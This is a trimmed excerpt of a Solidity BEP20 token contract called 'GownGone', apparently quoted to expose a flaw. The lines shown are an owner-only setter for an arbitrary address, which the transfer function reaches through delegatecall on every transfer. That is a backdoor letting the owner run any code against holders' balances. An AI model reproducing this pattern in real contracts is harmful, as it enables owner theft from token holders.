...
contract GownGone is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'GownGone';
  ...
  */
  ...
  function claimDividendGOGO(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_GOGO.delegatecall(
  ...
  function SetBonusGOGO(address c) public onlyOwner {
    C_GOGO = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendGOGO(sender, recipient, amount);   
